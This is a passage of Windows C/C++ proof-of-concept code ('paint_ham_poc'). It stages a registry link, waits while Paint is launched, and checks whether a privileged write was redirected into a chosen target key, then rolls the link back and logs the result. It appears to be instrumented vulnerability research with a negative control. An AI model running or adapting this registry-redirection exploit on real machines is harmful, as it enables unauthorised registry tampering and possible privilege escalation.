    DWORD notifyError = ERROR_SUCCESS;
    DWORD waitResult = WAIT_TIMEOUT;
    bool parseOk = false;
    bool snapshotBeforeOk = false;
    bool snapshotAfterOk = false;
    bool targetPreconditionOk = false;
    bool stageOk = false;
    bool rollbackOk = false;
    bool notifyArmed = false;
    bool targetMutated = false;
    bool changed = false;
    const wchar_t* reason = L"unknown";
    int exitCode = 1;

    parseOk = ParseOptions(argc, argv, &request);
    if (!parseOk) {
        return 1;
    }

    (void)CaptureTokenEvidence();
    wprintf(
        L"paint_ham_poc_start source=%ls target=%ls trigger_mode=%ls observe_ms=%lu settle_ms=%lu\n",
        GP_PAINT_HAM_SOURCE,
        request.targetSubKey,
        TriggerModeName(request.triggerMode),
        request.observeMs,
        request.settleMs);

    boundary = CheckTargetBoundary(request.targetSubKey);
    source = CheckSourceControl();
    wprintf(
        L"candidate_pair source=%ls target=%ls result=%ls reason=%ls\n",
        GP_PAINT_HAM_SOURCE,
        request.targetSubKey,
        (boundary.keep && source.keep) ? L"keep" : L"reject",
        !boundary.keep ? L"target-boundary-failed" : (!source.keep ? L"source-control-failed" : L"source-target-keep"));
    if (!boundary.keep) {
        reason = boundary.reason;
        goto summary;
    }
    if (!source.keep) {
        reason = source.reason;
        goto summary;
    }

    snapshotBeforeOk = CaptureSnapshot(request.targetSubKey, L"before", &before);
    if (!snapshotBeforeOk) {
        reason = L"target-snapshot-failed";
        goto cleanup;
    }
    if (before.mixedPresent) {
        wprintf(
            L"target_precondition result=reject reason=mixed-already-present target=%ls mixed_type=%lu mixed_qword_valid=%u mixed_qword=0x%016llx\n",
            request.targetSubKey,
            before.mixedType,
            before.mixedQwordValid ? 1 : 0,
            (unsigned long long)before.mixedQword);
        reason = L"mixed-already-present";
        goto cleanup;
    }
    targetPreconditionOk = true;
    wprintf(L"target_precondition result=keep reason=mixed-absent target=%ls\n", request.targetSubKey);

    stageOk = StageRegistryLink(request.targetSubKey, nativeTarget, ARRAYSIZE(nativeTarget));
    if (!stageOk) {
        reason = L"stage-failed";
        goto cleanup;
    }

    notifyArmed = ArmTargetNotify(request.targetSubKey, &notifyKey, &notifyEvent, &notifyError);
    wprintf(
        L"target_notify armed=%u subtree=1 filters=name|last_set|security|attributes W32=0x%08lx\n",
        notifyArmed ? 1 : 0,
        notifyError);

    if (request.triggerMode == GpTriggerMode::Manual) {
        wprintf(
            L"ready_for_trigger source=%ls target=%ls trigger_mode=manual observe_ms=%lu action=\"launch Paint from Start, wait, close Paint\"\n",
            GP_PAINT_HAM_SOURCE,
            request.targetSubKey,
            request.observeMs);
        wprintf(L"registry_trigger=skip method=manual elevation_claim=0\n");
    }
    else {
        wprintf(
            L"ready_for_trigger source=%ls target=%ls trigger_mode=none observe_ms=%lu action=\"no trigger; negative control\"\n",
            GP_PAINT_HAM_SOURCE,
            request.targetSubKey,
            request.observeMs);
        wprintf(L"registry_trigger=skip method=none elevation_claim=0\n");
    }

    wprintf(L"observe_wait ms=%lu\n", request.observeMs);
    if (notifyArmed && notifyEvent) {
        waitResult = WaitForSingleObject(notifyEvent, request.observeMs);
    }
    else {
        Sleep(request.observeMs);
        waitResult = WAIT_TIMEOUT;
    }
    wprintf(
        L"target_notify fired=%u W32=0x%08lx\n",
        waitResult == WAIT_OBJECT_0 ? 1 : 0,
        waitResult);

    if (waitResult == WAIT_OBJECT_0 && request.settleMs > 0) {
        wprintf(L"settle_wait ms=%lu reason=notify-fired\n", request.settleMs);
        Sleep(request.settleMs);
    }
    else {
        wprintf(
            L"settle_wait ms=0 reason=%ls\n",
            waitResult == WAIT_OBJECT_0 ? L"disabled" : L"notify-not-fired");
    }

    snapshotAfterOk = CaptureSnapshot(request.targetSubKey, L"after", &after);
    if (!snapshotAfterOk) {
        reason = L"target-snapshot-failed";
        goto cleanup;
    }

    changed = before.hash != after.hash ||
        before.valueCount != after.valueCount ||
        before.mixedPresent != after.mixedPresent ||
        before.mixedHash != after.mixedHash;
    targetMutated =
        targetPreconditionOk &&
        !before.mixedPresent &&
        after.mixedPresent &&
        after.mixedType == REG_QWORD &&
        (changed || waitResult == WAIT_OBJECT_0);

    wprintf(
        L"target_registry_diff snapshot_changed=%u value_changed=%u material_changed=%u before_hash=0x%016llx after_hash=0x%016llx mixed_before=%u mixed_after=%u mixed_qword_after=0x%016llx\n",
        before.hash != after.hash ? 1 : 0,
        before.valueCount != after.valueCount || before.mixedHash != after.mixedHash ? 1 : 0,
        targetMutated ? 1 : 0,
        (unsigned long long)before.hash,
        (unsigned long long)after.hash,
        before.mixedPresent ? 1 : 0,
        after.mixedPresent ? 1 : 0,
        (unsigned long long)after.mixedQword);

cleanup:
    if (notifyKey) {
        RegCloseKey(notifyKey);
        notifyKey = NULL;
    }
    if (notifyEvent) {
        CloseHandle(notifyEvent);
        notifyEvent = NULL;
    }
    if (stageOk) {
        rollbackOk = CleanupRegistryLink();
    }

summary:
    if (!reason || wcscmp(reason, L"unknown") == 0) {
        reason = !boundary.keep ? boundary.reason :
            (!source.keep ? source.reason :
                (!snapshotBeforeOk ? L"target-snapshot-failed" :
                    (!targetPreconditionOk ? L"mixed-already-present" :
                        (!stageOk ? L"stage-failed" :
                            (!targetMutated ? L"no-effect" :
                                (!rollbackOk ? L"rollback-not-verified" : L"writer-context-external"))))));
    }

    if (boundary.keep && source.keep && stageOk && targetMutated && rollbackOk) {
        exitCode = 0;
    }

    wprintf(
        L"paint_ham_poc_summary boundary=%ls source=%ls stage=%ls notify_fired=%u target_changed=%u rollback=%ls claim=%ls reason=%ls\n",
        boundary.keep ? L"kept" : L"failed",
        source.keep ? L"keep" : L"reject",
        stageOk ? L"ok" : L"fail",
        waitResult == WAIT_OBJECT_0 ? 1 : 0,
        targetMutated ? 1 : 0,
        rollbackOk ? L"verified" : L"not-verified",
        targetMutated && rollbackOk ? L"target-mutated-unattributed" : L"none",
        reason);

    if (request.hold) {
        wprintf(L"hold=key\n");
        _getch();
    }
    wprintf(L"done=%ls\n", exitCode == 0 ? L"ok" : L"partial");
    return exitCode;
}

int wmain(int argc, wchar_t** argv)
{
    for (int i = 1; i < argc; ++i) {
        if (argv[i] &&
            (wcscmp(argv[i], L"--help") == 0 ||
             wcscmp(argv[i], L"-h") == 0 ||
             wcscmp(argv[i], L"/?") == 0)) {
            PrintUsage();
            return 0;
        }
    }

    if (!ResolveNativeApis()) {
        return 1;
    }
    return RunPaintHamPoc(argc, argv);
}
